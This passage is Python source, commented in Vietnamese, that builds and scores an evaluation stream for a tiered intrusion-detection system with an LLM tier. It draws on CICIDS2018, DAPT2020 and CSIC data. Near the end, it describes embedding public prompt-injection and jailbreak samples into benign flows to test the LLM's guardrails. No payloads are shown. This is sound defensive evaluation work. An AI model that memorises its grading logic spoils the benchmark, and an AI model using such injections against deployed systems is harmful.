    # --- MAX DỮ LIỆU THÔ TỪ RAW: ĐA-NGÀY CICIDS (nguồn KHỐI LƯỢNG + đa dạng tấn công) ---
    import os

    import pandas as pd

    print(f"LOADING RAW CICIDS ({len(cicids_max_days)} ngày, ~{cicids_max_rows} dòng)...")

    cic_dir = os.path.join(ROOT, "data", "raw", "cicids2018")
    n_days = max(1, len(cicids_max_days))
    per_day = max(1, cicids_max_rows // n_days)
    per_atk = max(1, int(per_day * cicids_attack_ratio))  # còn lại là benign (nền để drop)
    per_ben = max(1, per_day - per_atk)
    _POP = ("Label", "Timestamp", "Flow ID", "Src IP", "Dst IP", "Src Port")

    for d_idx, day_file in enumerate(cicids_max_days):
        cic_path = os.path.join(cic_dir, day_file)
        if not os.path.exists(cic_path):
            continue
        try:
            df_cic = pd.read_csv(
                cic_path, nrows=RAW_DAY_SCAN_ROWS, low_memory=False, on_bad_lines="skip"
            )
        except Exception as _e:  # 1 file lỗi KHÔNG được giết cả build
            print(f"  [!] Bỏ qua {day_file}: {_e}")
            continue
        df_cic.rename(columns=lambda x: x.strip(), inplace=True)
        if "Label" not in df_cic.columns:
            continue
        df_cic = df_cic[df_cic["Label"].astype(str).str.strip() != "Label"]  # bỏ header lặp
        _lab = df_cic["Label"].astype(str).str.strip().str.lower()  # pyright: ignore[reportAttributeAccessIssue]
        atk_df = df_cic.loc[_lab != "benign"]
        ben_df = df_cic.loc[_lab == "benign"]
        if len(atk_df) > per_atk:
            atk_df = atk_df.sample(per_atk, random_state=42)  # pyright: ignore[reportAttributeAccessIssue]
        if len(ben_df) > per_ben:
            ben_df = ben_df.sample(per_ben, random_state=42)  # pyright: ignore[reportAttributeAccessIssue]
        rows = (
            pd.concat([atk_df, ben_df])  # pyright: ignore[reportCallIssue,reportArgumentType]
            if (len(atk_df) or len(ben_df))
            else df_cic.head(0)
        )
        # IP nguồn của CICIDS là TỔNG HỢP (bộ CSV "TrafficForML" đã bỏ địa chỉ thật), nên
        # ta phải tự gán. Bản trước gán `192.168.{ngày}.{i % 254}` với `i` chạy trên khung
        # ĐÃ NỐI tấn công-rồi-benign: cùng một IP quay vòng mỗi 254 dòng bất kể nhãn, nên
        # 2.159/2.286 IP "tấn công" cũng là IP lành tính. Hai hệ quả đều tệ:
        #   1. Không thể đo được gì ở MỨC IP (containment, uy tín, tái phạm) — danh tính IP
        #      vô nghĩa thì mọi quy trách nhiệm theo IP cũng vô nghĩa.
        #   2. Cơ chế chặn-vĩnh-viễn theo uy tín chặn IP sau lần tấn công đầu, rồi chặn tiếp
        #      ~84% lưu lượng LÀNH TÍNH của chính IP đó -> thác báo động giả thuần tuý do
        #      cách đánh số, không phải tính chất của hệ thống.
        # Tách hai dải là TRUNG THÀNH với testbed gốc: CSE-CIC-IDS2018 chạy tấn công từ một
        # mạng ~50 máy TÁCH BIỆT với 420 máy nạn nhân. Cả hai dải đều nằm trong
        # `trusted_internal_subnets` của config nên không tạo bất đối xứng nào cho Tier-1.
        n_atk_host = n_ben_host = 0
        for i, (_, row) in enumerate(rows.iterrows()):
            is_attack = str(row.get("Label", "")).strip().lower() != "benign"
            log = row.to_dict()
            # CSV CICIDS thô có Flow Byts/s = Inf (chia cho Flow Duration = 0). `pd.isna`
            # chỉ bắt NaN, KHÔNG bắt Inf — Inf lọt vào Welford là trung bình/phương sai
            # hỏng vĩnh viễn. Quy về 0 theo đúng quy ước default của `_safe_float`.
            for k, v in log.items():
                if pd.isna(v) or (isinstance(v, float) and not math.isfinite(v)):
                    log[k] = 0
            port = _safe_int(row.get("Dst Port", 0))
            if is_attack:
                src_ip = f"172.16.{d_idx % 32}.{n_atk_host % 254}"
                n_atk_host += 1
            else:
                src_ip = f"192.168.{10 + (d_idx % 40)}.{n_ben_host % 254}"
                n_ben_host += 1
            log.update(
                {
                    "Source IP": src_ip,
                    "Destination IP": "10.0.0.1",
                    "Destination Port": port if port else (80 if is_attack else 443),
                    "Protocol": _safe_int(row.get("Protocol", 6)) or 6,
                    "service": _infer_service_from_port(port),  # TÍN HIỆU LUỒNG THẬT (từ cổng)
                }
            )
            for _k in _POP:
                log.pop(_k, None)
            ev = {
                "source": "cicids_max",
                "log": log,
                "expected_threat": is_attack,
                "label": "Attack" if is_attack else "Benign",
                "t": tkey(1 + i % 5),
            }
            # Bù warmup bằng benign THẬT (Welford cần baseline ấm trước khi bật Z-score).
            if not is_attack and len(warmup) < WARMUP_N:
                ev.pop("t", None)
                warmup.append(ev)
            else:
                main.append(ev)

    # --- DAPT2020 raw: day2..day5 (CÓ tấn công THẬT: Network/Web scan, Dir/Account
    #     Bruteforce, SQLi, Command Injection, Data Exfiltration). day1 toàn "Normal" -> BỎ. ---
    DAPT_DAYS = ("day2.csv", "day3.csv", "day4.csv", "day5.csv")
    dapt_dir = os.path.join(ROOT, "data", "raw", "dapt2020")
    dapt_per_day = max(1, dapt_max_rows // len(DAPT_DAYS))
    for dd_idx, dfile in enumerate(DAPT_DAYS):
        dpath = os.path.join(dapt_dir, dfile)
        if not os.path.exists(dpath):
            continue
        try:
            df_dapt = pd.read_csv(dpath, low_memory=False, on_bad_lines="skip")
        except Exception as _e:
            print(f"  [!] Bỏ qua DAPT {dfile}: {_e}")
            continue
        df_dapt.rename(columns=lambda x: x.strip(), inplace=True)
        if len(df_dapt) > dapt_per_day:
            df_dapt = df_dapt.sample(dapt_per_day, random_state=42)
        # Cùng lý do như CICIDS ở trên: dải tấn công và dải benign phải RỜI NHAU, nếu không
        # danh tính IP vô nghĩa. (Nguồn `dapt` — chuỗi APT — thì GIỮ NGUYÊN IP thật của
        # DAPT2020, kể cả khi một host vừa gửi lưu lượng lành vừa gửi tấn công: đó là hành
        # vi THẬT của máy bị chiếm quyền và chính là thứ liên kết chiến dịch cần bắt.)
        n_atk_host = n_ben_host = 0
        for i, (_, row) in enumerate(df_dapt.iterrows()):
            label = str(row.get("Label", row.get("label", ""))).strip().lower()
            is_attack = label not in ["normal", "benign"]
            if is_attack:
                _src = f"172.20.{dd_idx}.{n_atk_host % 254}"
                n_atk_host += 1
            else:
                _src = f"192.168.{40 + dd_idx}.{n_ben_host % 254}"
                n_ben_host += 1
            log = {
                "Source IP": _src,
                "Destination IP": "10.0.0.1",
                "Destination Port": 80 if is_attack else 443,
                "Protocol": 6,
                "Flow Duration": _safe_int(row.get("Flow Duration", row.get("Flow Bytes/s", 0))),
                "Total Fwd Packets": _safe_int(row.get("Total Fwd Packet")),
                "Total Backward Packets": _safe_int(row.get("Total Bwd packets")),
                "Total Length of Fwd Packets": _safe_int(row.get("Total Length of Fwd Packet")),
                "Total Length of Bwd Packets": _safe_int(row.get("Total Length of Bwd Packet")),
                "Flow Pkts/s": _safe_float(row.get("Flow Packets/s")),
                "Fwd Seg Size Min": _safe_int(row.get("Fwd Segment Size Min", 0)),
                "Init Fwd Win Byts": _safe_int(row.get("FWD Init Win Bytes")),
                "Init Bwd Win Byts": _safe_int(row.get("Bwd Init Win Bytes")),
                "Bwd Pkt Len Min": _safe_int(row.get("Bwd Packet Length Min")),
                "PSH Flag Cnt": _safe_int(row.get("PSH Flag Count")),
                "service": "HTTP",
            }
            ev = {
                "source": "dapt_max",
                "log": log,
                "expected_threat": is_attack,
                "label": "Attack" if is_attack else "Benign",
                "t": tkey(1 + i % 5),
            }
            main.append(ev)

    # --- Zero-day: REAL-DERIVED (nền benign THẬT + 1 feature outlier), nhân theo
    #     zeroday_repeat (IP riêng) cho tải demo. Cổng cho phép + fwd thấp + không signature
    #     => luật TĨNH bỏ sót; lệch baseline mạnh => Welford Z-score bắt. Xem `_build_zerodays`.
    main.extend(_build_zerodays(samples, tkey, repeat=zeroday_repeat))

    # --- Inject Adversarial (4 payload OWASP THẬT) ---
    main.extend(_build_adversarials(tkey))

    # --- Inject CSIC 2010: bằng chứng tầng ỨNG DỤNG THẬT --------------------
    # Phần CICIDS của luồng là NetFlow THUẦN — không một ký tự payload — nên năng lực
    # ÁNH XẠ KỸ THUẬT của Tier-2 không thể trình diễn được trên đó (bằng chứng để suy ra
    # kỹ thuật KHÔNG TỒN TẠI trong đầu vào). CSIC bổ sung đúng lớp bằng chứng còn thiếu,
    # và khác hai nguồn biên soạn đã gỡ, đây là request HTTP THẬT.
    main.extend(_build_csic(tkey, csic_max))

    # --- Đối kháng nhắm vào LLM (prompt injection / jailbreak công khai) ----
    # MẶC ĐỊNH 0: benchmark hiện có KHÔNG chấm nhóm này, bật lên vô điều kiện sẽ làm mọi
    # con số cũ trôi mà không ai biết. Script nào cần thì truyền tay (`build_demo_small`).
    main.extend(_build_adv_llm(samples, tkey, adv_llm_max))

    main.sort(key=lambda x: x["t"])
    return warmup, main, apt_truth, len(chains)


# --------------------------------------------------------------------------- #
# CHẤM LUỒNG — MỘT nguồn sự thật cho mọi script đo Tier-1 offline
# --------------------------------------------------------------------------- #
# Nguồn KHÔNG thuộc phân loại nhị phân, kèm LÝ DO (khác hẳn "bỏ sót"):
#   dapt                 -> flow rút gọn tín hiệu thấp, đo ở chỉ số APT emergent
#   zeroday              -> đo riêng ở chỉ số zero-day (static bỏ sót vs Welford bắt)
#   adversarial          -> đầu vào DO TÁC GIẢ BIÊN SOẠN, không phải dữ liệu thật
NON_CLASSIFIED_SOURCES: dict[str, str] = {
    "dapt": "đo ở chỉ số APT emergent",
    "zeroday": "đo ở chỉ số zero-day",
    "adversarial": "đầu vào biên soạn — không tính vào tỉ lệ",
    "adv_llm": "đo ở chỉ số guardrail + quy kết ATLAS, không thuộc phân loại flow nhị phân",
}

# Nguồn flow CÓ nhãn ground-truth -> được chấm phân loại. `*_max` trích thẳng từ CSV thô
# và mang nhãn Label gốc; đây cũng là nơi có benign HELD-OUT (chưa dùng học baseline).
# `csic` ĐƯỢC chấm phân loại: đây là request HTTP THẬT có nhãn normal/anomalous của chính
# bộ dữ liệu — khác hẳn `grayzone`/`webattack` (tác giả tự soạn) đã bị gỡ.
CLASSIFIED_SOURCES: frozenset[str] = frozenset({"cicids", "cicids_max", "dapt_max", "csic"})


# --------------------------------------------------------------------------- #
# CÙNG CHÍNH SÁCH ẤY, NHƯNG CHO `ground_truth.json`
# --------------------------------------------------------------------------- #
# `NON_CLASSIFIED_SOURCES` ở trên chỉ chắn được đường LUỒNG (`build_stream`), vì nó lọc theo
# khoá `source` mà chỉ vỏ bọc luồng mới có. `ground_truth.json` là artefact KHÁC, dựng bởi
# `scripts/fetch_and_build_dataset.py`, và ở dòng ~502 tệp đó CỐ Ý chèn 50 mẫu đối địch do
# tác giả biên soạn — đúng mục đích ban đầu là để thử Guardrails, không phải để chấm điểm.
#
# Nhưng `ground_truth.json` KHÔNG mang khoá `source`, nên không script nào lọc được chúng.
# Hậu quả đo được: trong 300 mẫu "chấm được quy kết" (có payload + có mã ATT&CK) thì 50 mẫu
# — **16,7%** — là do tác giả tự viết, và cả 50 cùng một đáp án `T1190`. Riêng điều đó đã
# nâng `T1190` từ 52 lên 102 mẫu, tức thưởng thêm cho việc đoán đúng một mã duy nhất.
#
# Mẫu đối địch VẪN Ở LẠI tệp (evaluate_adversarial.py cần chúng). Chỉ cấm chúng vào TỈ LỆ.
AUTHORED_GT_LABELS: frozenset[str] = frozenset({"Adversarial"})


def is_authored_sample(sample: dict) -> bool:
    """Mẫu `ground_truth.json` do TÁC GIẢ BIÊN SOẠN — cấm vào mọi tỉ lệ của luận văn."""
    return ((sample.get("input") or {}).get("cicids_label")) in AUTHORED_GT_LABELS


def drop_authored(samples: list) -> tuple[list, int]:
    """Lọc mẫu biên soạn khỏi tập chấm điểm. Trả `(còn_lại, số_đã_bỏ)`.

    Luôn trả kèm SỐ ĐÃ BỎ để nơi gọi in ra được — loại mẫu trong im lặng thì người đọc
    không có cách nào biết mẫu số đã đổi.
    """
    kept = [s for s in samples if not is_authored_sample(s)]
    return kept, len(samples) - len(kept)


def score_stream(
    engine,
    warmup: list,
    main: list,
    *,
    collect_zeroday: bool = True,
    on_dapt=None,
) -> dict:
    """Chạy luồng gộp qua Tier-1 và chấm phân loại — dùng chung, KHÔNG chép lại.

    VÌ SAO TỒN TẠI: `evaluate_unified_stream.py` và `run_threshold_sensitivity.py` từng
    có HAI bản sao của cùng vòng chấm này, và cả hai mang y hệt hai lỗi:
      1. Chỉ khớp `cicids`/`dapt`/`zeroday` nên ~25.000 sự kiện `cicids_max`/`dapt_max`
         rơi ra ngoài mọi nhánh -> bị bỏ IM LẶNG khỏi ma trận nhầm lẫn.
      2. Chấm cả 150 flow warmup, tức đo lớp benign trên CHÍNH tập dùng để học baseline
         Welford (test-on-train).
    Gộp về một hàm để sửa một lần là hết, và để nguồn mới thêm vào `build_stream()` không
    thể lặng lẽ biến mất nữa (xem nhánh `UNHANDLED:`).

    warmup: CHỈ đưa qua `engine.evaluate()` để học baseline — KHÔNG chấm.

    on_dapt: callback `(ev, event_index)` gọi cho MỖI sự kiện nguồn `dapt`, ngay sau khi
        nó đi qua Tier-1. Phát hiện APT phải bám ĐÚNG thứ tự luồng (bản án chỉ được bật
        sau khi tích luỹ đủ sự kiện đa-ngày), nên việc ghi Threat Memory buộc phải nằm
        TRONG chính vòng lặp này thay vì một lượt quét riêng.

    Trả dict: confusion · scored_by_source · excluded_by_source · records · zeroday ·
              n_flagged · n_stream_events.
    """
    cls = {"tp": 0, "fp": 0, "tn": 0, "fn": 0}
    scored_by_source: dict[str, int] = defaultdict(int)
    excluded_by_source: dict[str, int] = defaultdict(int)
    records: list[dict] = []  # cho per_class_report / bootstrap CI
    zd_results: list[dict] = []
    n_flagged = 0
    # Đếm phán quyết Tier-1 theo TỪNG hành động. Tồn tại vì `n_flagged` (= `_is_threat`) trả
    # lời câu hỏi PHÁT HIỆN ("Tier-1 có coi đây là mối đe doạ không") chứ KHÔNG trả lời câu
    # hỏi TẢI ("ca này có phải nhờ tầng trên không") — `BLOCK_IP` nằm trong `THREAT_ACTIONS`
    # nhưng là điểm CUỐI, chặn tại Tier-1 và không bao giờ tới LLM.
    #
    # LỖI ĐÃ VÁ: `evaluate_feedback_loop` từng lấy `n_flagged` làm "tỉ lệ leo thang". Hệ quả
    # là mỗi khi vòng phản hồi THÀNH CÔNG (luật mới biến một ca escalate thành BLOCK_IP tại
    # Tier-1, tải LLM về 0) thì con số "leo thang" lại TĂNG. Thước đo tăng đúng lúc thứ nó đo
    # được cải thiện — nên kết luận thu được là ngược dấu.
    #
    # Ranh giới lấy THẲNG từ đường chạy thật: `subscriber.py` chỉ rẽ sang Cổng ML rồi LLM khi
    # `action == "ESCALATE"`; mọi hành động khác Tier-1 tự xử xong (chính nó đếm là "gỡ tải").
    action_counts: dict[str, int] = defaultdict(int)
    # Dấu vết mức IP theo ĐÚNG thứ tự luồng, phục vụ `metrics_core.ip_containment`.
    # Ghi cho MỌI nguồn (kể cả nguồn không chấm phân loại) vì ngăn chặn là câu hỏi
    # vận hành độc lập với việc sự kiện đó có nhãn lớp hay không. Người gọi tự lọc
    # theo `source` — IP tổng hợp và IP thật phải báo cáo TÁCH NHAU.
    ip_trace: list[dict] = []

    for ev in warmup:
        engine.evaluate(ev["log"])
        excluded_by_source["warmup_benign"] += 1

    for ev_index, ev in enumerate(main, start=1):
        src = ev["source"]

        if src in CLASSIFIED_SOURCES:
            res = engine.evaluate(ev["log"])
            action_counts[res["tier1_action"]] += 1
            flagged = _is_threat(res["tier1_action"])
            threat = bool(ev.get("expected_threat"))
            n_flagged += int(flagged)
            if threat:
                cls["tp" if flagged else "fn"] += 1
            else:
                cls["fp" if flagged else "tn"] += 1
            ip_trace.append(
                {
                    "ip": ev["log"].get("Source IP", ""),
                    "source": src,
                    "is_attack": threat,
                    "blocked": res["tier1_action"] == "BLOCK_IP",
                }
            )
            scored_by_source[src] += 1
            records.append(
                {
                    "label": ev.get("label") or ("Attack" if threat else "Benign"),
                    "source": src,
                    "is_threat": threat,
                    "flagged": flagged,
                    "action": res["tier1_action"],
                }
            )

        elif src == "zeroday":
            static_act = static_only_action(engine, ev["log"]) if collect_zeroday else None
            res = engine.evaluate(ev["log"])
            action_counts[res["tier1_action"]] += 1
            flagged = _is_threat(res["tier1_action"])
            n_flagged += int(flagged)
            excluded_by_source["zeroday"] += 1
            ip_trace.append(
                {
                    "ip": ev["log"].get("Source IP", ""),
                    "source": src,
                    "is_attack": True,
                    "blocked": res["tier1_action"] == "BLOCK_IP",
                }
            )
            if collect_zeroday:
                zd_results.append(
                    {
                        "id": ev.get("id"),
                        "name": ev.get("name"),
                        "mitre": ev.get("mitre"),
                        "static_only_action": static_act,
                        "full_action": res["tier1_action"],
                        "z_score": round(res.get("tier1_z_score", 0.0), 2),
                        "tier1_score": res.get("tier1_score", 0),
                        "caught_by_welford": static_act in BENIGN_ACTIONS and flagged,
                    }
                )

        elif src in NON_CLASSIFIED_SOURCES:  # dapt / adversarial
            res = engine.evaluate(ev["log"])
            action_counts[res["tier1_action"]] += 1
            n_flagged += int(_is_threat(res["tier1_action"]))
            excluded_by_source[src] += 1
            ip_trace.append(
                {
                    "ip": ev["log"].get("Source IP", ""),
                    "source": src,
                    "is_attack": bool(ev.get("is_attack") or ev.get("expected_threat")),
                    "blocked": res["tier1_action"] == "BLOCK_IP",
                }
            )
            if src == "dapt" and on_dapt is not None:
                on_dapt(ev, ev_index)

        else:
            # KHÔNG im lặng: nguồn mới mà quên khai báo chính là lỗi đã nuốt 25.000 sự kiện.
            _res = engine.evaluate(ev["log"])
            action_counts[_res["tier1_action"]] += 1
            excluded_by_source[f"UNHANDLED:{src}"] += 1

    return {
        "confusion": cls,
        "scored_by_source": dict(scored_by_source),
        "excluded_by_source": dict(excluded_by_source),
        "records": records,
        "zeroday": zd_results,
        "n_flagged": n_flagged,
        "n_stream_events": len(warmup) + len(main),
        "ip_trace": ip_trace,
        # `n_flagged` = PHÁT HIỆN (gồm cả BLOCK_IP, vốn kết thúc tại Tier-1).
        # `n_escalated` = TẢI thật đẩy lên Cổng ML/LLM. Hai câu hỏi khác nhau, đừng thay nhau.
        "action_counts": dict(action_counts),
        "n_escalated": action_counts.get(ESCALATE_ACTION, 0),
        "n_await_hitl": action_counts.get("AWAIT_HITL", 0),
    }


def warn_unhandled(excluded_by_source: dict) -> dict:
    """In cảnh báo to nếu có nguồn chưa khai báo. Trả về phần bị bỏ sót (rỗng = sạch)."""
    unhandled = {k: v for k, v in excluded_by_source.items() if k.startswith("UNHANDLED:")}
    if unhandled:
        print(
            f"\n[!] CẢNH BÁO: nguồn sự kiện CHƯA KHAI BÁO bị loại khỏi phân loại: {unhandled}"
            f"\n    Thêm nhánh vào `score_stream()` hoặc khai báo vào NON_CLASSIFIED_SOURCES"
            f" kèm lý do — đừng để nó biến mất im lặng."
        )
    return unhandled


# --------------------------------------------------------------------------- #
# Giao ước ONLINE dùng chung (kế thừa stream_unified_online.py đã gỡ bỏ):
# enrich + determine_queue + build_sequence — scripts/demo.py, push_datatest.py,
# build_demo.py, build_datatest.py và tests đều import từ ĐÂY (1 nguồn chân lý).
# --------------------------------------------------------------------------- #
FIREWALL_PORTS = {21, 22, 23, 53, 139, 445, 3389}
WAF_PORTS = {80, 443, 8080}


def determine_queue(log: dict) -> str:
    """Port-based → payload/UA → default firewall."""
    try:
        port = int(log.get("Destination Port", 0) or 0)
    except (TypeError, ValueError):
        port = 0
    if port in FIREWALL_PORTS:
        return "queue_firewall"
    if port in WAF_PORTS:
        return "queue_waf"
    if log.get("payload") or log.get("user_agent"):
        return "queue_waf"
    return "queue_firewall"


def enrich(ev: dict, demo_signals: bool = False) -> dict:
    """Gắn metadata theo nguồn vào log để subscriber/agent/dashboard dùng được.

    Toàn bộ đi trong MỘT blob JSON dưới field 'log' (đúng giao ước publisher).

    demo_signals: CHỈ bật cho luồng TRÌNH DIỄN (build_demo.py). Khi bật, DAPT tấn công
    được đính ngữ cảnh threat-intel THẬT (giai đoạn + MITRE TTP có sẵn trong dataset
    DAPT2020) vào field `message` để Tier-2 ánh xạ ĐÚNG kỹ thuật ĐA DẠNG (T1046/T1087/
    T1083/T1190/T1068...) thay vì đoán T1571 từ mỗi số cổng. TẮT cho benchmark
    (build_datatest.py) -> KHÔNG rò nhãn vào số thực nghiệm (datatest.json giữ nguyên).
    """
    log = dict(ev["log"])
    log["dataset_source"] = "unified_stream"
    log["unified_source"] = ev["source"]

    if ev["source"] == "dapt":
        # Metadata để subscriber ghi chuỗi APT (emergent) vào Threat Memory.
        log["apt_phase"] = ev.get("phase")
        log["apt_day"] = ev.get("day")
        log["apt_label"] = ev.get("label", "")
        log["apt_is_attack"] = bool(ev.get("is_attack"))
        log["apt_timestamp"] = ev.get("timestamp", "")
        log["apt_mitre_ttp"] = ev.get("mitre_ttp", "")  # TTP THẬT (hiển thị tab Threat Intel)
        # DEMO ONLY: ngữ cảnh tương quan THẬT của DAPT2020. `message` sống sót qua
        # rule_engine (engine chỉ ghi đè tier1_reasons) và được node_rag_context đọc vào
        # truy vấn RAG -> Tier-2 ánh xạ được kỹ thuật ĐA DẠNG thay vì đoán T1571 từ số cổng.
        #
        # CHỈ ĐƯA HOẠT ĐỘNG QUAN SÁT ĐƯỢC, KHÔNG ĐƯA MÃ ATT&CK. Bản trước ghi thẳng
        # "kỹ thuật MITRE ATT&CK ghi nhận: T1046" vào message — tức trao ĐÁP ÁN cho LLM, nên
        # mọi phép đo ánh xạ kỹ thuật trên luồng demo đều vòng tròn (LLM chỉ chép lại). Nhãn
        # hoạt động ('Network Scan', 'SQL Injection'…) thì khác: đó là thứ một WAF/SIEM
        # thật SẼ xuất ra, còn việc quy nó về mã ATT&CK nào chính là năng lực đang trình
        # diễn -> phải để RAG + LLM tự làm. Mã thật vẫn nằm ở `apt_mitre_ttp` cho tab
        # Threat Intel, và khoá đó bị loại trước khi lên prompt (tiền tố `apt_`).
        if demo_signals and bool(ev.get("is_attack")) and ev.get("label"):
            log["message"] = (
                f"[Tương quan SIEM] Hoạt động ghi nhận: {ev.get('label', '')}; "
                f"giai đoạn chiến dịch: {ev.get('phase', '')}."
            )
    elif ev["source"] == "zeroday":
        log["zd_id"] = ev.get("id")
        log["zd_mitre"] = ev.get("mitre")
        log["zd_name"] = ev.get("name")
        # LỖI ĐÃ SỬA: thiếu `expected_threat` ở nhánh này (và ở `adversarial` bên dưới)
        # trong khi nhánh nguồn biên soạn (đã gỡ) lại có. Zero-day là tấn công THEO ĐỊNH NGHĨA — mỗi
        # mẫu là một flow benign thật bị đẩy một đặc trưng lên cực trị. Thiếu cờ nên mọi
        # thống kê đếm bằng `expected_threat` (gồm dòng báo cáo của build_demo.py) BỎ SÓT
        # toàn bộ nhóm này, khiến tỉ lệ tấn công của luồng demo bị báo thấp hơn thực tế.
        log["gt_label"] = "Attack"
        log["expected_threat"] = True
    elif ev["source"] == "adversarial":
        # payload OWASP LLM Top-10 để thử Guardrails/Tier-2 khi escalate
        # LỖI ĐÃ SỬA: đọc `ev["log"]["gt_id"]` — khoá KHÔNG TỒN TẠI vì `_build_adversarials`
        # không đặt `gt_id`; định danh nằm ở `ev["id"]` (ADV-001…). Hệ quả: `adv_id` LUÔN
        # là chuỗi rỗng, nên không truy vết được mẫu đối kháng nào gây ra phán quyết nào.
        log["adv_id"] = ev.get("id", "")
        log["adv_mitre"] = ev.get("mitre", "")
        log["adv_source"] = "owasp_llm_top10"
        log["gt_label"] = "Attack"
        log["expected_threat"] = True
    elif ev["source"] == "csic":
        # Request HTTP THẬT (CSIC 2010). Nhãn mang tiền tố `wa_` -> bị
        # `subscriber._LABEL_KEY_PREFIXES` tước trước khi lên prompt LLM, nhưng vẫn còn
        # trong sidecar để đối chiếu hậu kiểm.
        log["wa_id"] = ev.get("id")
        log["wa_mitre"] = ev.get("mitre")
        log["wa_expected_action"] = ev.get("expected_action", "")
        log["gt_label"] = ev.get("label", "")
        log["expected_threat"] = bool(ev.get("expected_threat"))
    elif ev["source"] == "adv_llm":
        # Prompt injection / jailbreak CÔNG KHAI nhúng vào flow benign THẬT. Mọi khoá nhãn
        # mang tiền tố `adv_` nên đã nằm sẵn trong `_LABEL_KEY_PREFIXES` -> bị tước trước
        # khi lên prompt (không tự khai đáp án cho chính LLM đang bị tấn công).
        log["adv_id"] = ev.get("id", "")
        log["adv_mitre"] = ev.get("mitre", "")  # AML.T0051 — đáp án để hậu kiểm quy kết
        log["adv_source"] = ev.get("adv_origin", "")
        log["adv_llm_type"] = ev.get("adv_type", "")
        log["adv_llm_field"] = ev.get("adv_field", "")
        log["gt_label"] = "Attack"
        log["expected_threat"] = True
    else:  # cicids / cicids_max / dapt_max: flow có nhãn ground-truth phẳng
        log["gt_label"] = ev.get("label", "")
        log["expected_threat"] = bool(ev.get("expected_threat"))
    return log


def build_sequence():
    """Luồng phát online: warmup benign TRƯỚC (làm ấm Welford) rồi luồng chính trộn.

    Adversarial (OWASP LLM) đã được build_stream() trộn sẵn trong main — không cần
    cờ --include-adversarial như bản cũ. Trả về (seq, warmup, main, apt_truth, n_chains).
    """
    warmup, main, apt_truth, n_chains = build_stream()
    seq = list(warmup) + list(main)  # warmup giữ prefix; main đã sort theo thời gian
    return seq, warmup, main, apt_truth, n_chains
